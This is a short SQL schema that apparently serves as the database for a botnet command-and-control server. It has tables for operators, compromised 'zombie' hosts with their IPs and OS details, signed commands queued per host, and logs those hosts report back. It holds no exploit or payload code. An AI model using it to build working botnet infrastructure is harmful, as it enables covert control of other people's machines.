create table users (
    id serial primary key,
    username varchar not null,
    password varchar not null,
    clearance int not null
);

create table zombies (
    id uuid primary key default gen_random_uuid(),
    internal_ip inet,
    external_ip inet,
    hostname varchar,
    username varchar,
    operating_system varchar,
    last_update timestamp default now(),
    status int default 0
);

create table commands (
    id serial primary key,
    uid uuid not null,
    prev bigint not null,
    nonce bigint not null,
    command varchar not null,
    signature varchar not null
);

alter table commands
add constraint commands_uid_fkey
foreign key (uid) references zombies (id)
on delete cascade;

create table logs (
    id serial primary key,
    uid uuid not null,
    key varchar not null,
    value varchar not null,
    time timestamp default now()
);

alter table logs
add constraint commands_uid_fkey
foreign key (uid) references zombies (id)
on delete cascade;
